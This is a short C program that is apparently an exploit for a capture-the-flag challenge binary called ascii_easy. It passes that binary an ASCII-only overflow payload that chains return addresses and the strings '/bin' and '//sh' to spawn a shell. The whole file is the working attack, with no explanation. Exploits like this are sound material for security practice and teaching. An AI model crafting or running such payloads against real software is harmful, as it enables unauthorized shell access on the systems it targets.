#include <unistd.h>
int main(){
    char * payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaU5_U# VU/bin<{hUaaaaaaaaU5_U' VU//sh<{hUaaaaaaaaU5_U+ VUaaaa\\d`UU5_U+ VUaaaaQ*mU+ VUNsWU# VUdhlUvqfU";
    char *argv[] = {"/home/ascii_easy/ascii_easy",payload,NULL};
    execve("/home/ascii_easy/ascii_easy", argv,0);
}
